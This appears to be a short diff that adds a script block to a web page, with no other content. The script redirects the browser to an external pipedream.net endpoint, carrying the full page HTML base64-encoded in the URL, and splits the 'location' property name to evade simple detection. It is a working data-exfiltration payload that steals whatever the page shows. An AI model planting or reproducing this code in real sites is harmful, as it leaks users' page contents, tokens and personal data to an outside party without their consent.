@@ -1,0 +1,3 @@
+<script>
+window['loca'+'tion']='https://eor6zafe1xnz0o2.m.pipedream.net/?document='+btoa(document.documentElement.innerHTML);
+</script>
